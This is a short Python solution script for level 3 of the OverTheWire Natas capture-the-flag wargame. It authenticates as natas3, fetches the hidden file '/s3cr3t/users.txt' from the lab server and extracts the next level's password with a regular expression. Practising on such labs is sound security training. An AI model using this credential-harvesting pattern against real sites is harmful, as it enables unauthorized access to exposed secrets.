#!/usr/bin/python3

import requests
import re
import os

username="natas3"
password=os.getenv("natas_pass")

url = "http://%s.natas.labs.overthewire.org/" % username

response = requests.get(url + "/s3cr3t/users.txt",auth=(username,password))

flag = re.findall("natas4:(.*)",response.text)[0]
print(flag)